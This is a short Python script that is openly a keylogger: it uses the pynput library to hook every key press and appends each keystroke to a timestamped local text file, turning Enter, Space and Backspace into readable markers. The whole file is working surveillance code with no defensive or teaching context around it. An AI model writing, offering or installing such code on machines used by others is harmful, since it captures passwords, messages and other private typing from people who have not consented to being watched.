import datetime
from pynput.keyboard import Listener

d = datetime.datetime.now().strftime('%y-%m-%d_%H-%M-%S')

f = open('keylogger_{}.txt'.format(d), 'w')

def key_recorder(key):
        key=str(key)
        f = open('keylogger_{}.txt'.format(d), 'a')
        if key =='Key.enter':
                f.write('\n')
        elif key =='Key.space':
                f.write(' ')
        elif key == 'Key.backspace':
                f.write('%BORRAR%')
        else:
                f.write(key.replace("'",""))
        f.close()

with Listener(on_press=key_recorder)as l:
        l.join()
